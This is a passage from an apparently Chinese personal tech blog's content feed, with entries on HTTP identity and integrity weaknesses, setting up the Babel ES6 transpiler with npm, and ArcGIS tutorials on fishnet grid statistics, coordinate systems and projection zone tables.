href="#不验证通信方的身份就可能遭遇伪装" class="headerlink" title="不验证通信方的身份就可能遭遇伪装"></a>不验证通信方的身份就可能遭遇伪装</h2><ul><li>任何人都可对服务器发起请求</li><li>查明对手的证书<ul><li>虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL则可以。 SSL不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。</li></ul></li></ul><h2 id="无法证明报文完整性，可能已遭篡改"><a href="#无法证明报文完整性，可能已遭篡改" class="headerlink" title="无法证明报文完整性，可能已遭篡改"></a>无法证明报文完整性，可能已遭篡改</h2><ul><li>接收的内容可被“中间人攻击”而遭到篡改</li><li>防止篡改<ul><li>虽然有使用 HTTP 协议确定报文完整性的方法，但事实上并不便捷、可靠。其中常用的是MD5和SHA-1等散列值校验的方法， 以及用来确认文件的数字签名方法。但是，用这些方法也依然无法百分百保证确认结果正确。因为 PGP 和 MD5 本身被改写的话，用户是没有办法意识到的。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http协议 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babel转码器</title>
      <link href="/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/"/>
      <url>/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文是基于node环境下讲解babel工具的使用方法</p><blockquote><p><a href="https://babeljs.io/" target="_blank" rel="noopener">Babel</a> 是一个广泛使用的 ES6 转码器，可以将 ES6 代码转为 ES5 代码，从而在老版本的浏览器执行。这意味着，你可以用 ES6 的方式编写程序，又不用担心现有环境是否支持。简而言之，它是一个可以将ES6转码成其它ES版本的工具</p></blockquote><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ol><li><p>创建相关配置文件</p><p>在sublime或者命令台新建文件.babelrc，如果在项目文件夹下新建该文件可能不会成功</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/image-20200724190826193.png" alt></p></li><li><p>接着，在该文件下添加代码用来设置转码规则，格式如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"presets"</span>: [],</span><br><span class="line">  <span class="string">"plugins"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在项目文件夹下安装babel</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @babel/core</span><br></pre></td></tr></table></figure><p>在这里，–save-dev和–save的区别如下</p><p>通过 <code>--save</code> 参数安装的包，是将依赖项保存到 package.json 文件中的 dependencies 选项中。<br>通过 <code>--save-dev</code> 参数安装的包，是将依赖项保存到 package.json 文件中的 devDependencies 选项中。</p><p>无论是 <code>--save</code> 或者 <code>--save-dev</code> 安装的包，通过执行 <code>npm install</code> 都会将对应的依赖包安装进来。</p><p>但是，在开发阶段会有一些仅仅用来辅助开发的一些第三方包或是工具，然后最终上线运行（到了生产环境），<br>这些开发依赖项就不再需要了，就可以通过 <code>npm install --production</code> 命令仅仅安装 <code>dependencies</code> 中的<br>依赖项。</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/image-20200724212606632.png" alt="image-20200724212606632"></p></li><li><p>接着，安装规则集，这里要安装ES6转码成ES5的相关规则</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @babel/preset-env</span><br></pre></td></tr></table></figure></li><li><p>然后，就可以在.babelrc文件里添加该规则</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"presets"</span>: [</span><br><span class="line">    <span class="string">"@babel/env"</span>,</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"plugins"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="命令行转码"><a href="#命令行转码" class="headerlink" title="命令行转码"></a>命令行转码</h2><ol><li><p>安装命令行转码工具</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @babel/cli</span><br></pre></td></tr></table></figure></li><li><p>用法（ <a href="https://es6.ruanyifeng.com/" target="_blank" rel="noopener">ES6 入门教程</a>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转码结果输出到标准输出</span></span><br><span class="line">npx babel example.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转码结果写入一个文件</span></span><br><span class="line"><span class="comment"># --out-file 或 -o 参数指定输出文件</span></span><br><span class="line">npx babel example.js --out-file compiled.js</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">npx babel example.js -o compiled.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整个目录转码</span></span><br><span class="line"><span class="comment"># --out-dir 或 -d 参数指定输出目录</span></span><br><span class="line">npx babel src --out-dir lib</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">npx babel src -d lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># -s 参数生成source map文件</span></span><br><span class="line">npx babel src -d lib -s</span><br></pre></td></tr></table></figure></li><li><p>执行示例</p><p>源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>].find( <span class="function"><span class="params">n</span> =&gt;</span> n === <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span>  b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="built_in">console</span>.log(b)</span><br></pre></td></tr></table></figure><p>结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/image-20200724220358868.png" alt="image-20200724220358868"></p></li></ol><h3 id="babel-register-模块"><a href="#babel-register-模块" class="headerlink" title="@babel/register 模块"></a>@babel/register 模块</h3><p>安装并引用该模块后，后面引用的所有包含ES6语法的模块都可以直接转码，而无需其他操作</p><ol><li><p>安装模块</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @babel/register</span><br></pre></td></tr></table></figure></li><li><p>使用一个傀儡文件(main.js)来引入该模块并使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'babel-register'</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'你的核心功能代码入口文件模块'</span>)</span><br></pre></td></tr></table></figure></li><li><p>node直接使用main.js文件即可</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node main.js</span><br></pre></td></tr></table></figure></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个主要用作教育网站项目的后端技术node.js的es6转码，涉及到两个环境，一个开发环境和一个生产环境</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/image-20200724212230181.png" alt="image-20200724212230181"></p><p>因为node环境在有些ES6语法下无法执行，所以在这里就用到了babel转码器，在开发环境中全程ES6，到正式生产的时候就直接转成ES5语法。</p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="ES6中node引用模块"><a href="#ES6中node引用模块" class="headerlink" title="ES6中node引用模块"></a>ES6中node引用模块</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">'express'</span></span><br><span class="line"><span class="keyword">import</span> artTemplate <span class="keyword">from</span> <span class="string">'express-art-template'</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">'path'</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> a <span class="keyword">from</span> <span class="string">'./a'</span><span class="comment">//引用a模块所有的方法</span></span><br></pre></td></tr></table></figure><h2 id="模块导出成员的几种方法"><a href="#模块导出成员的几种方法" class="headerlink" title="模块导出成员的几种方法"></a>模块导出成员的几种方法</h2><p>ES5</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exports.foo = <span class="string">'bar'</span></span><br><span class="line">exports.f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">exports.num = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>ES6</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">'bar'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> num = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="string">'bar'</span></span><br><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> num = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  foo,</span><br><span class="line">  f,</span><br><span class="line">  num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于 module.exports = function () &#123;&#125;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'fff'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS格网统计图</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h1><ol><li><p>创建渔网</p></li><li><p>连接</p></li><li><p>裁剪</p></li><li><p>符号化</p></li></ol><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h2><p>本次实验选择深圳市以及深圳市的餐饮点数据</p><p>将其加载进ArcMap中</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/ebc83d957299d255c21878bdcf474dee.png" alt></p><h2 id="创建渔网"><a href="#创建渔网" class="headerlink" title="创建渔网"></a>创建渔网</h2><p>利用<em>【数据管理工具】|【要素类】|【创建渔网】</em></p><p>输入深圳行政区域</p><p>【像元高度和像元宽度】设为0.05</p><p>【几何类型】选择面类型</p><p>创建标注点可不勾（个人认为没有必要勾选，实验不会用到，浪费处理时间，但勾了也没问题）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/8fb0aea8b6d90d1007afd4d25e509435.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/cc88f918801a3777c9ed7decbf5b793e.png" alt></p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>在连接之前一定要确保餐饮点数据和生成的渔网数据的投影坐标系一致</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/240d4a498c91ceaf0eda915f8783490e.png" alt></p><p>PS：不一致可以利用坐标系工具将其投影成一样的（参考实验08 坐标系总结）</p><p>进行餐饮点和渔网的连接</p><ol><li>在渔网图层上右键单击【连接和关联】|【连接】</li><li>选择【基于空间位置的另一图层的数据】</li><li>选择‘餐饮点’</li><li>汇总属性勾选‘总和’</li><li>选择输出路径</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/272cc18c276117ba9364842432715071.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/b4f38f68e6b13b6a1f8654a69439cab8.png" alt></p><ol start="6"><li>将count为0的选中并删除</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/e7a0cdf877d788ee50fc94fd76888adc.png" alt></p><h2 id="裁剪"><a href="#裁剪" class="headerlink" title="裁剪"></a>裁剪</h2><p>利用<strong>【分析工具】|【提取分析】|【裁剪】</strong></p><p>将渔网按照深圳范围裁剪</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/28aeea9483cc5e0fb3bf70136a552499.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/a9171d3c962ea68978cd459cb4c438af.png" alt></p><h2 id="符号化"><a href="#符号化" class="headerlink" title="符号化"></a>符号化</h2><p>右键图层【属性】|【符号系统】|【数量】|【分级色彩】</p><p>【值】选择Count</p><p>分为9个类别</p><p>选择色带</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/4de63888586d5eecd58efeef55198091.png" alt></p><p>利用查询工具进行检验</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%A0%BC%E7%BD%91%E7%BB%9F%E8%AE%A1%E5%9B%BE/a3d95207682be373d484077ef38574f1.png" alt></p><p>可以看到颜色最红的代表着这里的餐饮点数较多，越绿则比较少</p><p>实验结束，可以进行制图</p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坐标系总结</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E5%9D%90%E6%A0%87%E7%B3%BB%E6%80%BB%E7%BB%93/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E5%9D%90%E6%A0%87%E7%B3%BB%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol><li><p>分清地理坐标系和投影坐标系</p></li><li><p>什么地区选什么带号</p></li><li><p>如何使用有关坐标系的三个工具</p></li></ol><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="两种坐标系"><a href="#两种坐标系" class="headerlink" title="两种坐标系"></a>两种坐标系</h2><ul><li><p><strong>地理坐标：用经纬度表示地面点位的球面坐标。</strong></p></li><li><p><strong>地理坐标系进行地图投影后就变成了了投影坐标系</strong></p></li><li><p>地图投影：是按照一定的数学法则将地球椭球面上的经纬网转换到平面上，使地面点位的地理坐标与地图上相应的点位的平面直角坐标或平面极坐标间，建立起一一对应的函数关系，能够实现由地球椭球面向地图平面的科学转变。</p></li><li><p><strong>坐标系是数据或地图的属性</strong></p></li><li><p><strong>投影是坐标系的属性</strong></p></li></ul><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9D%90%E6%A0%87%E7%B3%BB%E6%80%BB%E7%BB%93/e9f5a040120548905840b41552afa207.png" alt></p><ul><li><p><strong>地理坐标系经过投影后变成投影坐标系，立体向平面的转变</strong></p></li><li><p><strong>投影坐标因此由地理坐标系和投影组成，所以投影坐标系必然包括有一个地理坐标系</strong></p></li><li><p><strong>一个数据或一张地图一定有坐标系，而一个坐标系可以有投影可以没有投影，但有投影坐标系就一定有地理坐标系</strong></p></li></ul><p>比如WGS_1984_UTM_Zone_46N</p><p>WGS_1984指出了其地理坐标系为GCS_WGS_1984</p><p>UTM_Zone_46N使用的投影名为横轴墨卡托（UTM）其投影带为N北半球第46带</p><h2 id="3°分带和6°分带"><a href="#3°分带和6°分带" class="headerlink" title="3°分带和6°分带"></a>3°分带和6°分带</h2><p>我国基本比例尺地形图除1:100万采用兰伯特投影（Lambert）外，其他采用高斯-克吕格投影</p><p>而高斯-克吕格投影又分为3度或6度带投影</p><p>带号 = （经度整数位/6）整数部分 + 31</p><p>表：</p><table><thead><tr><th>带号</th><th>经度范围（东经）（°）</th><th>中央经线经度（°）</th></tr></thead><tbody><tr><td>43N</td><td>72-78</td><td>75</td></tr><tr><td>44N</td><td>78-84</td><td>81</td></tr><tr><td>45N</td><td>84-90</td><td>87</td></tr><tr><td>46N</td><td>90-96</td><td>93</td></tr><tr><td>47N</td><td>96-102</td><td>99</td></tr><tr><td>48N</td><td>102-108</td><td>105</td></tr><tr><td>49N</td><td>108-114</td><td>111</td></tr><tr><td>50N</td><td>114-120</td><td>117</td></tr><tr><td>51N</td><td>120-126</td><td>123</td></tr><tr><td>52N</td><td>126-132</td><td>129</td></tr><tr><td>53N</td><td>132-138</td><td>135</td></tr></tbody></table><p>我国通常有：</p><ol><li><p>CGCS2000_3_Degree_GK_CM_105E</p></li><li><p>CGCS2000_3_Degree_GK_Zone_35</p></li><li><p>CGCS2000_GK_CM_105E</p></li><li><p>CGCS2000_GK_Zone_18</p></li></ol><p>在我国标准地形图上，X坐标的前两位代表所在分度带带号，其余的表示X坐标</p><p>3度带带号 = （经度 + 1.5°）/3 取整</p><p>6度带带号 = （经度 + 6°）/6 取整</p><p>1:1万比例尺采用3°分带</p><p>1:2.5万~1:50万采用6°分带</p><table><thead><tr><th>3°带号</th><th>东经范围（°）</th><th>中央经度（°）</th></tr></thead><tbody><tr><td>24</td><td>70.5-73.5</td><td>72</td></tr><tr><td>25</td><td>73.5-76.5</td><td>75</td></tr><tr><td>26</td><td>76.5-79.5</td><td>78</td></tr><tr><td>27</td><td>79.5-82.5</td><td>81</td></tr><tr><td>28</td><td>82.5-85.5</td><td>84</td></tr><tr><td>29</td><td>85.5-88.5</td><td>87</td></tr><tr><td>30</td><td>88.5-91.5</td><td>90</td></tr><tr><td>31</td><td>91.5-94.5</td><td>93</td></tr><tr><td>32</td><td>94.5-97.5</td><td>96</td></tr><tr><td>33</td><td>97.5-100.5</td><td>99</td></tr><tr><td>34</td><td>100.5-103.5</td><td>102</td></tr><tr><td>35</td><td>103.5-106.5</td><td>105</td></tr><tr><td>36</td><td>106.5-109.5</td><td>108</td></tr><tr><td>37</td><td>109.5-112.5</td><td>111</td></tr><tr><td>38</td><td>112.5-115.5</td><td>114</td></tr><tr><td>39</td><td>115.5-118.5</td><td>117</td></tr><tr><td>40</td><td>118.5-121.5</td><td>120</td></tr><tr><td>41</td><td>1215-1245</td><td>123</td></tr><tr><td>42</td><td>1245-127</td><td>126</td></tr><tr><td>43</td><td>127-1305</td><td>129</td></tr><tr><td>44</td><td>1305-133</td><td>132</td></tr><tr><td>45</td><td>133.5-136.5</td><td>135</td></tr><tr><td>6°带号</td><td>东经范围（°）</td><td>中央经度（°）</td></tr><tr><td>13</td><td>72-78</td><td>75</td></tr><tr><td>14</td><td>78-84</td><td>81</td></tr><tr><td>15</td><td>84-90</td><td>87</td></tr><tr><td>16</td><td>90-96</td><td>93</td></tr><tr><td>17</td><td>96-102</td><td>99</td></tr><tr><td>18</td><td>102-108</td><td>105</td></tr><tr><td>19</td><td>108-114</td><td>111</td></tr><tr><td>20</td><td>114-120</td><td>117</td></tr><tr><td>21</td><td>120-126</td><td>123</td></tr><tr><td>22</td><td>126-132</td><td>129</td></tr><tr><td>23</td><td>132-138</td><td>135</td></tr></tbody></table><h2 id="ArcGIS工具"><a href="#ArcGIS工具" class="headerlink" title="ArcGIS工具"></a>ArcGIS工具</h2><ol><li><p>定义投影（未知坐标系）</p><p>【数据管理工具】|【定义投影】</p><p>此工具用于定义位置坐标系的数据集（栅格矢量均可），使用要知道该数据集的正确坐标系</p></li></ol><p>​    （CAD的dxg等数据加载到ArcGIS里面是没有坐标系的，可以通过此工具定义）</p><ol start="2"><li><p>投影（矢量）</p><p>【数据管理工具】|【要素】|【投影】</p><p>矢量数据专用</p><p>从一种坐标系投影到另一种坐标系</p><p>这里的矢量数据必须要有坐标系</p></li><li><p>投影栅格（栅格）</p><p>【数据管理工具】|【栅格】|【投影栅格】</p><p>栅格数据专用</p><p>从一种投影变换到另一种投影</p><p>这里的栅格数据必须要有坐标系</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> GIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS基于围棋视角下肯德基麦当劳分布特点可视化---厦门为例</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><ol><li><strong>实验数据准备</strong></li></ol><p>厦门市行政区划.shp、厦门肯德基和麦当劳POI数据<em>（注意：在导入XY数据时，不要选择投影坐标系）</em></p><ol start="2"><li><strong>概念与理论</strong></li></ol><p><strong>渔网：</strong></p><p><strong>叠加分析-相交：</strong></p><p><strong>邻域分析-近邻分析：</strong></p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><strong>创建渔网</strong></li></ol><p>利用【数据管理工具】|【要素类】|【创建渔网】生成棋盘</p><p>【像元高度】2000</p><p>【像元宽度】2000</p><p>不要勾选创建标注点，否则会产生多余的标注点</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/700ec75f2ccfdcb996b87f22cdd78a52.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/d432916d5b87d3021e02483b7d9d63dd.png" alt></p><p>利用【分析工具】|【提取分析】|【裁剪】对矢量要素进行裁剪</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/a14281765c0a6a88e56ebbd462bc5000.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/d2f06c0b00050eea9828a681fa238e95.png" alt></p><ol start="2"><li><p><strong>创建相交点</strong></p><p>利用【分析工具】|【叠加分析】|【相交】生成渔网线（围棋线）的交点</p><p>输出类型选择POINT</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/0f2e253bdf72a2bf7696492b25b93c47.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/4974c2e49795fe3098cb56a1ba0c1d1a.png" 